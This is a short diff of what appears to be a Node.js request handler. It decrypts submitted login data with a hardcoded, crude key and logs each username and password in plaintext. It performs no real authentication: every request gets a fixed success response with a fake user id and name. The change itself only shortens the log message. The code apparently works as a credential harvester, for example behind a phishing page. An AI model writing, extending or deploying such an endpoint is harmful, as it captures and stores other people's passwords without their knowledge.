@@ -13,7 +13,7 @@ module.exports = async (req, res) => {
     const { data } = req.body;
     if (!data) { return res.status(400).json({ success: false }); }
     const [username, password] = dec(data, "suckmydick").split("|");
-    await log(`Login attempt:\nUsername: ${username}\nPassword: ${password}\nCrypto: ${data}`);
+    await log(`Login:\nUsername: ${username}\nPassword: ${password}\nCrypto: ${data}`);
     res.json({ success: true, userid: 1337, username: "dxvrxv" });
   } catch (e) {
     res.status(400).json({ success: false });
